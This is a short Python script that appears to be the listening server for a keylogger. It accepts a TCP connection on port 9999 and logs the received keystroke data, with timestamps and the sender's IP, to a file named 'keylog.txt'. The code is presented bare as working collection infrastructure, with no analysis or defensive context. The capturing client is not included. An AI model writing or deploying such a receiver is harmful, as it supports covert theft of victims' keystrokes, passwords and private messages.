import socket
from datetime import datetime

HOST = '0.0.0.0'
PORT = 9999

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    print("[*] Listening for incoming connections...")

    conn, addr = s.accept()
    client_ip = addr[0]
    print(f"[*] Connection received from {client_ip}")

    # Create/Open the log file
    with conn, open("keylog.txt", "a") as log_file:
        session_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write("\n" + "="*50 + "\n")
        log_file.write(f"Session started: {session_time}\n")
        log_file.write(f"Client IP: {client_ip}\n")
        log_file.write("="*50 + "\n")

        while True:
            data = conn.recv(1024)
            if not data:
                break
            decoded = data.decode("utf-8")
            timestamp = datetime.now().strftime("[%H:%M:%S]")
            entry = f"{timestamp} {decoded}"
            print(f"[+] {entry}")
            log_file.write(entry + "\n")
